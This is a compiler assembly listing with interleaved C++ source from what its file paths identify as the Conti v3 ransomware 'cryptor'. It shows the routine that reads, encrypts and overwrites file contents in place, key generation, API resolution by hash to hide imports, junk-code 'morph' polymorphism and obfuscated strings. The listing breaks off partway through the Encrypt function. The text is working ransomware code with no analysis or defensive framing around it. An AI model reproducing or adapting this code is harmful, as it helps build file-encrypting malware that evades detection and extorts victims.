; 92   : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x55f5048a, 105);//GetProcAddress(hKernel32, OBFA("ReadFile"));

  001d4	ba 0f 00 00 00	 mov	 edx, 15
  001d9	41 b8 8a 04 f5
	55		 mov	 r8d, 1442120842		; 55f5048aH
  001df	44 8d 4a 5a	 lea	 r9d, QWORD PTR [rdx+90]
  001e3	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 93   : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

  001e8	4c 8d 4d e4	 lea	 r9, QWORD PTR BytesRead$[rbp-80]
  001ec	48 c7 44 24 20
	00 00 00 00	 mov	 QWORD PTR [rsp+32], 0
  001f5	44 8b c7	 mov	 r8d, edi
  001f8	49 8b d4	 mov	 rdx, r12
  001fb	48 8b cb	 mov	 rcx, rbx
  001fe	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1174 : 		if (!Success || !BytesRead) {

  00200	85 c0		 test	 eax, eax
  00202	0f 84 a7 02 00
	00		 je	 $LN212@EncryptFul
  00208	8b 75 e4	 mov	 esi, DWORD PTR BytesRead$[rbp-80]
  0020b	85 f6		 test	 esi, esi
  0020d	0f 84 9c 02 00
	00		 je	 $LN212@EncryptFul
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00213	c7 45 e0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$3[rbp-80], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0021a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0021f	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-80]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1178 : 		TotalRead += BytesRead;

  00222	4c 03 f6	 add	 r14, rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00225	f7 e9		 imul	 ecx
  00227	8b c2		 mov	 eax, edx
  00229	c1 e8 1f	 shr	 eax, 31
  0022c	03 d0		 add	 edx, eax
  0022e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00231	3b c8		 cmp	 ecx, eax
  00233	74 4a		 je	 SHORT $LN62@EncryptFul

; 49   : 		_morph_var += (int)a + 2;

  00235	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-80]
  00238	83 c1 02	 add	 ecx, 2
  0023b	41 03 ce	 add	 ecx, r14d
  0023e	89 4d e0	 mov	 DWORD PTR _morph_var$3[rbp-80], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00241	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$3[rbp-80]
  00244	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00249	7d 07		 jge	 SHORT $LN202@EncryptFul
  0024b	ff c8		 dec	 eax
  0024d	83 c8 fc	 or	 eax, -4
  00250	ff c0		 inc	 eax
$LN202@EncryptFul:
  00252	85 c0		 test	 eax, eax
  00254	75 7a		 jne	 SHORT $LN61@EncryptFul
  00256	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL54@EncryptFul:
  00260	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$3[rbp-80]
  00263	ff c0		 inc	 eax
  00265	89 45 e0	 mov	 DWORD PTR _morph_var$3[rbp-80], eax
  00268	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$3[rbp-80]
  0026b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00270	7d 07		 jge	 SHORT $LN201@EncryptFul
  00272	ff c8		 dec	 eax
  00274	83 c8 fc	 or	 eax, -4
  00277	ff c0		 inc	 eax
$LN201@EncryptFul:
  00279	85 c0		 test	 eax, eax
  0027b	74 e3		 je	 SHORT $LL54@EncryptFul

; 51   : 	}

  0027d	eb 51		 jmp	 SHORT $LN61@EncryptFul
$LN62@EncryptFul:

; 52   : 	else if (_morph_var % 2) {

  0027f	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$3[rbp-80]

; 53   : 		_morph_var -= (int)a - 2;

  00282	b9 02 00 00 00	 mov	 ecx, 2
  00287	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$3[rbp-80]
  0028a	41 2b ce	 sub	 ecx, r14d
  0028d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0028f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00294	89 4d e0	 mov	 DWORD PTR _morph_var$3[rbp-80], ecx
  00297	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-80]
  0029a	f7 e9		 imul	 ecx
  0029c	8b c2		 mov	 eax, edx
  0029e	c1 e8 1f	 shr	 eax, 31
  002a1	03 d0		 add	 edx, eax
  002a3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002a6	3b c8		 cmp	 ecx, eax
  002a8	75 26		 jne	 SHORT $LN61@EncryptFul
  002aa	66 0f 1f 44 00
	00		 npad	 6
$LL56@EncryptFul:
  002b0	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$3[rbp-80]
  002b3	ff c0		 inc	 eax
  002b5	89 45 e0	 mov	 DWORD PTR _morph_var$3[rbp-80], eax
  002b8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  002bd	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-80]
  002c0	f7 e9		 imul	 ecx
  002c2	8b c2		 mov	 eax, edx
  002c4	c1 e8 1f	 shr	 eax, 31
  002c7	03 d0		 add	 edx, eax
  002c9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002cc	3b c8		 cmp	 ecx, eax
  002ce	74 e0		 je	 SHORT $LL56@EncryptFul
$LN61@EncryptFul:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1183 : 		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

  002d0	44 8b 4d e4	 mov	 r9d, DWORD PTR BytesRead$[rbp-80]
  002d4	49 8d 4f 18	 lea	 rcx, QWORD PTR [r15+24]
  002d8	4d 8b c4	 mov	 r8, r12
  002db	49 8b d4	 mov	 rdx, r12
  002de	e8 00 00 00 00	 call	 ECRYPT_encrypt_bytes

; 1185 : 		Offset.QuadPart = -((LONGLONG)BytesRead);

  002e3	8b 5d e4	 mov	 ebx, DWORD PTR BytesRead$[rbp-80]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  002e6	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1186 : 		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  002eb	49 8b 7f 08	 mov	 rdi, QWORD PTR [r15+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  002ef	41 b8 a7 1b e5
	d6		 mov	 r8d, -689628249		; d6e51ba7H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1185 : 		Offset.QuadPart = -((LONGLONG)BytesRead);

  002f5	48 f7 db	 neg	 rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  002f8	44 8d 4a 4a	 lea	 r9d, QWORD PTR [rdx+74]
  002fc	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  00301	41 b9 01 00 00
	00		 mov	 r9d, 1
  00307	45 33 c0	 xor	 r8d, r8d
  0030a	48 8b d3	 mov	 rdx, rbx
  0030d	48 8b cf	 mov	 rcx, rdi
  00310	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1186 : 		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  00312	85 c0		 test	 eax, eax
  00314	0f 84 95 01 00
	00		 je	 $LN212@EncryptFul
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0031a	c7 45 e0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$2[rbp-80], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00321	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00326	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-80]
  00329	f7 e9		 imul	 ecx
  0032b	8b c2		 mov	 eax, edx
  0032d	c1 e8 1f	 shr	 eax, 31
  00330	03 d0		 add	 edx, eax
  00332	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00335	3b c8		 cmp	 ecx, eax
  00337	74 46		 je	 SHORT $LN85@EncryptFul

; 49   : 		_morph_var += (int)a + 2;

  00339	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-80]
  0033c	83 c1 02	 add	 ecx, 2
  0033f	03 cb		 add	 ecx, ebx
  00341	89 4d e0	 mov	 DWORD PTR _morph_var$2[rbp-80], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00344	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$2[rbp-80]
  00347	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0034c	7d 07		 jge	 SHORT $LN199@EncryptFul
  0034e	ff c8		 dec	 eax
  00350	83 c8 fc	 or	 eax, -4
  00353	ff c0		 inc	 eax
$LN199@EncryptFul:
  00355	85 c0		 test	 eax, eax
  00357	75 77		 jne	 SHORT $LN84@EncryptFul
  00359	0f 1f 80 00 00
	00 00		 npad	 7
$LL77@EncryptFul:
  00360	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$2[rbp-80]
  00363	ff c0		 inc	 eax
  00365	89 45 e0	 mov	 DWORD PTR _morph_var$2[rbp-80], eax
  00368	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$2[rbp-80]
  0036b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00370	7d 07		 jge	 SHORT $LN198@EncryptFul
  00372	ff c8		 dec	 eax
  00374	83 c8 fc	 or	 eax, -4
  00377	ff c0		 inc	 eax
$LN198@EncryptFul:
  00379	85 c0		 test	 eax, eax
  0037b	74 e3		 je	 SHORT $LL77@EncryptFul

; 51   : 	}

  0037d	eb 51		 jmp	 SHORT $LN84@EncryptFul
$LN85@EncryptFul:

; 52   : 	else if (_morph_var % 2) {

  0037f	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$2[rbp-80]

; 53   : 		_morph_var -= (int)a - 2;

  00382	b9 02 00 00 00	 mov	 ecx, 2
  00387	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$2[rbp-80]
  0038a	2b cb		 sub	 ecx, ebx
  0038c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0038e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00393	89 4d e0	 mov	 DWORD PTR _morph_var$2[rbp-80], ecx
  00396	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-80]
  00399	f7 e9		 imul	 ecx
  0039b	8b c2		 mov	 eax, edx
  0039d	c1 e8 1f	 shr	 eax, 31
  003a0	03 d0		 add	 edx, eax
  003a2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  003a5	3b c8		 cmp	 ecx, eax
  003a7	75 27		 jne	 SHORT $LN84@EncryptFul
  003a9	0f 1f 80 00 00
	00 00		 npad	 7
$LL79@EncryptFul:
  003b0	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$2[rbp-80]
  003b3	ff c0		 inc	 eax
  003b5	89 45 e0	 mov	 DWORD PTR _morph_var$2[rbp-80], eax
  003b8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003bd	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-80]
  003c0	f7 e9		 imul	 ecx
  003c2	8b c2		 mov	 eax, edx
  003c4	c1 e8 1f	 shr	 eax, 31
  003c7	03 d0		 add	 edx, eax
  003c9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  003cc	3b c8		 cmp	 ecx, eax
  003ce	74 e0		 je	 SHORT $LL79@EncryptFul
$LN84@EncryptFul:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1192 : 		Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);

  003d0	49 8b 4f 08	 mov	 rcx, QWORD PTR [r15+8]
  003d4	44 8b c6	 mov	 r8d, esi
  003d7	49 8b d4	 mov	 rdx, r12
  003da	e8 00 00 00 00	 call	 ?WriteFullData@@YAHPEAX0K@Z ; WriteFullData

; 1193 : 		if (!Success) {

  003df	85 c0		 test	 eax, eax
  003e1	0f 84 c8 00 00
	00		 je	 $LN212@EncryptFul
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  003e7	c7 45 e0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$1[rbp-80], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  003ee	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003f3	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-80]
  003f6	f7 e9		 imul	 ecx
  003f8	8b c2		 mov	 eax, edx
  003fa	c1 e8 1f	 shr	 eax, 31
  003fd	03 d0		 add	 edx, eax
  003ff	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00402	3b c8		 cmp	 ecx, eax
  00404	74 49		 je	 SHORT $LN106@EncryptFul

; 49   : 		_morph_var += (int)a + 2;

  00406	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-80]
  00409	83 c1 02	 add	 ecx, 2
  0040c	03 ce		 add	 ecx, esi
  0040e	89 4d e0	 mov	 DWORD PTR _morph_var$1[rbp-80], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00411	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$1[rbp-80]
  00414	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00419	7d 07		 jge	 SHORT $LN196@EncryptFul
  0041b	ff c8		 dec	 eax
  0041d	83 c8 fc	 or	 eax, -4
  00420	ff c0		 inc	 eax
$LN196@EncryptFul:
  00422	85 c0		 test	 eax, eax
  00424	75 7a		 jne	 SHORT $LN105@EncryptFul
  00426	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL98@EncryptFul:
  00430	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$1[rbp-80]
  00433	ff c0		 inc	 eax
  00435	89 45 e0	 mov	 DWORD PTR _morph_var$1[rbp-80], eax
  00438	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$1[rbp-80]
  0043b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00440	7d 07		 jge	 SHORT $LN195@EncryptFul
  00442	ff c8		 dec	 eax
  00444	83 c8 fc	 or	 eax, -4
  00447	ff c0		 inc	 eax
$LN195@EncryptFul:
  00449	85 c0		 test	 eax, eax
  0044b	74 e3		 je	 SHORT $LL98@EncryptFul

; 51   : 	}

  0044d	eb 51		 jmp	 SHORT $LN105@EncryptFul
$LN106@EncryptFul:

; 52   : 	else if (_morph_var % 2) {

  0044f	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$1[rbp-80]

; 53   : 		_morph_var -= (int)a - 2;

  00452	b9 02 00 00 00	 mov	 ecx, 2
  00457	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$1[rbp-80]
  0045a	2b ce		 sub	 ecx, esi
  0045c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0045e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00463	89 4d e0	 mov	 DWORD PTR _morph_var$1[rbp-80], ecx
  00466	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-80]
  00469	f7 e9		 imul	 ecx
  0046b	8b c2		 mov	 eax, edx
  0046d	c1 e8 1f	 shr	 eax, 31
  00470	03 d0		 add	 edx, eax
  00472	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00475	3b c8		 cmp	 ecx, eax
  00477	75 27		 jne	 SHORT $LN105@EncryptFul
  00479	0f 1f 80 00 00
	00 00		 npad	 7
$LL100@EncryptFul:
  00480	8b 45 e0	 mov	 eax, DWORD PTR _morph_var$1[rbp-80]
  00483	ff c0		 inc	 eax
  00485	89 45 e0	 mov	 DWORD PTR _morph_var$1[rbp-80], eax
  00488	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0048d	8b 4d e0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-80]
  00490	f7 e9		 imul	 ecx
  00492	8b c2		 mov	 eax, edx
  00494	c1 e8 1f	 shr	 eax, 31
  00497	03 d0		 add	 edx, eax
  00499	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0049c	3b c8		 cmp	 ecx, eax
  0049e	74 e0		 je	 SHORT $LL100@EncryptFul
$LN105@EncryptFul:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1165 : 	while (TotalRead < BytesToEncrypt) {

  004a0	41 b9 00 00 50
	00		 mov	 r9d, 5242880		; 00500000H
  004a6	4d 3b f5	 cmp	 r14, r13
  004a9	0f 8c b1 fb ff
	ff		 jl	 $LL2@EncryptFul
$LN212@EncryptFul:
  004af	48 8b 74 24 48	 mov	 rsi, QWORD PTR [rsp+72]

; 1194 : 			break;
; 1195 : 		}
; 1196 : 
; 1197 : 		morphcode(BytesToWrite);
; 1198 : 
; 1199 : 	}
; 1200 : 
; 1201 : 	return TRUE;

  004b4	b8 01 00 00 00	 mov	 eax, 1
  004b9	48 8b 9c 24 90
	00 00 00	 mov	 rbx, QWORD PTR [rsp+144]
  004c1	48 8b 7c 24 40	 mov	 rdi, QWORD PTR [rsp+64]
$LN139@EncryptFul:

; 1202 : }

  004c6	48 8b 4d e8	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-80]
  004ca	48 33 cc	 xor	 rcx, rsp
  004cd	e8 00 00 00 00	 call	 __security_check_cookie
  004d2	48 83 c4 50	 add	 rsp, 80			; 00000050H
  004d6	41 5f		 pop	 r15
  004d8	41 5e		 pop	 r14
  004da	41 5d		 pop	 r13
  004dc	41 5c		 pop	 r12
  004de	5d		 pop	 rbp
  004df	c3		 ret	 0
$LN211@EncryptFul:

; 1194 : 			break;
; 1195 : 		}
; 1196 : 
; 1197 : 		morphcode(BytesToWrite);
; 1198 : 
; 1199 : 	}
; 1200 : 
; 1201 : 	return TRUE;

  004e0	b8 01 00 00 00	 mov	 eax, 1
  004e5	eb df		 jmp	 SHORT $LN139@EncryptFul
?EncryptFull@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z ENDP	; EncryptFull
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z
_TEXT	SEGMENT
$T2 = 48
FileInfo$ = 160
Buffer$ = 168
CryptoProvider$ = 176
PublicKey$ = 184
?Encrypt@cryptor@@YAHPEAUfile_info@1@PEAE_K2@Z PROC	; cryptor::Encrypt, COMDAT

; 1211 : {

$LN2936:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000f	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  00014	55		 push	 rbp
  00015	48 8d 6c 24 a9	 lea	 rbp, QWORD PTR [rsp-87]
  0001a	48 81 ec 90 00
	00 00		 sub	 rsp, 144		; 00000090H
  00021	4d 8b f0	 mov	 r14, r8
  00024	48 8b fa	 mov	 rdi, rdx

; 1212 : 	BOOL Result = FALSE;
; 1213 : 	DWORD BytesToRead = 0;
; 1214 : 	LONGLONG TotalRead = 0;
; 1215 : 	LONGLONG TotalWrite = 0;
; 1216 : 
; 1217 : 	if (!GenKey(CryptoProvider, PublicKey, FileInfo)) {

  00027	4c 8b c1	 mov	 r8, rcx
  0002a	48 8b d9	 mov	 rbx, rcx
  0002d	49 8b ce	 mov	 rcx, r14
  00030	49 8b d1	 mov	 rdx, r9
  00033	49 8b f1	 mov	 rsi, r9
  00036	e8 00 00 00 00	 call	 ?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z ; GenKey
  0003b	85 c0		 test	 eax, eax
  0003d	0f 85 13 02 00
	00		 jne	 $LN2@Encrypt
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  00043	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  00046	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  0004c	44 8d 48 5d	 lea	 r9d, QWORD PTR [rax+93]
  00050	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  00055	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00057	c6 45 f7 00	 mov	 BYTE PTR $T2[rbp-57], 0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  0005b	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0005e	c6 45 f8 3d	 mov	 BYTE PTR $T2[rbp-56], 61 ; 0000003dH
  00062	c6 45 f9 27	 mov	 BYTE PTR $T2[rbp-55], 39 ; 00000027H
  00066	c6 45 fa 32	 mov	 BYTE PTR $T2[rbp-54], 50 ; 00000032H
  0006a	c6 45 fb 27	 mov	 BYTE PTR $T2[rbp-53], 39 ; 00000027H
  0006e	c6 45 fc 29	 mov	 BYTE PTR $T2[rbp-52], 41 ; 00000029H
  00072	c6 45 fd 27	 mov	 BYTE PTR $T2[rbp-51], 39 ; 00000027H
  00076	c6 45 fe 0c	 mov	 BYTE PTR $T2[rbp-50], 12
  0007a	c6 45 ff 27	 mov	 BYTE PTR $T2[rbp-49], 39 ; 00000027H
  0007e	c6 45 00 73	 mov	 BYTE PTR $T2[rbp-48], 115 ; 00000073H
  00082	c6 45 01 27	 mov	 BYTE PTR $T2[rbp-47], 39 ; 00000027H
  00086	c6 45 02 5f	 mov	 BYTE PTR $T2[rbp-46], 95 ; 0000005fH
  0008a	c6 45 03 27	 mov	 BYTE PTR $T2[rbp-45], 39 ; 00000027H
  0008e	c6 45 04 7c	 mov	 BYTE PTR $T2[rbp-44], 124 ; 0000007cH
  00092	c6 45 05 27	 mov	 BYTE PTR $T2[rbp-43], 39 ; 00000027H
  00096	c6 45 06 39	 mov	 BYTE PTR $T2[rbp-42], 57 ; 00000039H
  0009a	c6 45 07 27	 mov	 BYTE PTR $T2[rbp-41], 39 ; 00000027H
  0009e	c6 45 08 29	 mov	 BYTE PTR $T2[rbp-40], 41 ; 00000029H
  000a2	c6 45 09 27	 mov	 BYTE PTR $T2[rbp-39], 39 ; 00000027H
  000a6	c6 45 0a 5f	 mov	 BYTE PTR $T2[rbp-38], 95 ; 0000005fH
  000aa	c6 45 0b 27	 mov	 BYTE PTR $T2[rbp-37], 39 ; 00000027H
  000ae	c6 45 0c 04	 mov	 BYTE PTR $T2[rbp-36], 4
  000b2	c6 45 0d 27	 mov	 BYTE PTR $T2[rbp-35], 39 ; 00000027H
  000b6	c6 45 0e 39	 mov	 BYTE PTR $T2[rbp-34], 57 ; 00000039H
  000ba	c6 45 0f 27	 mov	 BYTE PTR $T2[rbp-33], 39 ; 00000027H
  000be	c6 45 10 5c	 mov	 BYTE PTR $T2[rbp-32], 92 ; 0000005cH
  000c2	c6 45 11 27	 mov	 BYTE PTR $T2[rbp-31], 39 ; 00000027H
  000c6	c6 45 12 5f	 mov	 BYTE PTR $T2[rbp-30], 95 ; 0000005fH
  000ca	c6 45 13 27	 mov	 BYTE PTR $T2[rbp-29], 39 ; 00000027H
  000ce	c6 45 14 1b	 mov	 BYTE PTR $T2[rbp-28], 27
  000d2	c6 45 15 27	 mov	 BYTE PTR $T2[rbp-27], 39 ; 00000027H
  000d6	c6 45 16 0b	 mov	 BYTE PTR $T2[rbp-26], 11
  000da	c6 45 17 27	 mov	 BYTE PTR $T2[rbp-25], 39 ; 00000027H
  000de	c6 45 18 30	 mov	 BYTE PTR $T2[rbp-24], 48 ; 00000030H
  000e2	c6 45 19 27	 mov	 BYTE PTR $T2[rbp-23], 39 ; 00000027H
  000e6	c6 45 1a 5f	 mov	 BYTE PTR $T2[rbp-22], 95 ; 0000005fH
  000ea	c6 45 1b 27	 mov	 BYTE PTR $T2[rbp-21], 39 ; 00000027H
  000ee	c6 45 1c 1b	 mov	 BYTE PTR $T2[rbp-20], 27
  000f2	c6 45 1d 27	 mov	 BYTE PTR $T2[rbp-19], 39 ; 00000027H
  000f6	c6 45 1e 40	 mov	 BYTE PTR $T2[rbp-18], 64 ; 00000040H
  000fa	c6 45 1f 27	 mov	 BYTE PTR $T2[rbp-17], 39 ; 00000027H
  000fe	c6 45 20 65	 mov	 BYTE PTR $T2[rbp-16], 101 ; 00000065H
  00102	c6 45 21 27	 mov	 BYTE PTR $T2[rbp-15], 39 ; 00000027H
  00106	c6 45 22 39	 mov	 BYTE PTR $T2[rbp-14], 57 ; 00000039H
  0010a	c6 45 23 27	 mov	 BYTE PTR $T2[rbp-13], 39 ; 00000027H
  0010e	c6 45 24 5f	 mov	 BYTE PTR $T2[rbp-12], 95 ; 0000005fH
  00112	c6 45 25 27	 mov	 BYTE PTR $T2[rbp-11], 39 ; 00000027H
  00116	c6 45 26 48	 mov	 BYTE PTR $T2[rbp-10], 72 ; 00000048H
  0011a	c6 45 27 27	 mov	 BYTE PTR $T2[rbp-9], 39	; 00000027H
  0011e	c6 45 28 12	 mov	 BYTE PTR $T2[rbp-8], 18
  00122	c6 45 29 27	 mov	 BYTE PTR $T2[rbp-7], 39	; 00000027H
  00126	c6 45 2a 38	 mov	 BYTE PTR $T2[rbp-6], 56	; 00000038H
